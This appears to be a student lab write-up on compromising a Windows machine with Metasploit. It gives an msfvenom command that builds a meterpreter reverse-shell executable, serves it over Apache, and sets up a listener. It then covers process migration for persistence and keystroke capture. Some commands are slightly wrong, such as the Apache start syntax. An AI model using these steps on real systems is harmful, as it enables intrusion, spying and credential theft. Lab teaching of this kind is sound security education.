# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="1920" height="463" alt="exp 5" src="https://github.com/user-attachments/assets/744a002f-5669-4600-8742-6efe44a1cd79" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

<img width="955" height="821" alt="exp6 1" src="https://github.com/user-attachments/assets/231c6c2a-9bf5-4c6f-9ee1-d370d87362da" />




copy the fun.exe into the apache ```/var/www/html ```folder

<img width="1920" height="463" alt="exp 5" src="https://github.com/user-attachments/assets/8c16d29f-2162-4f4f-b986-044b1a4e6189" />




Start apache server ```sudo systemctl apache2 start``` 





Check the status of apache2 ```sudo apache2 status```


Invoke msfconsole:

<img width="955" height="710" alt="image" src="https://github.com/user-attachments/assets/18944b3f-ff83-422b-ad58-367b584285b4" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="955" height="646" alt="exp 5 2" src="https://github.com/user-attachments/assets/48576e21-a39f-4713-8b7b-f936dd482880" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 

<img width="955" height="300" alt="exp6 3" src="https://github.com/user-attachments/assets/d51f97f3-4c1c-4113-aee3-a93e45abd4de" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

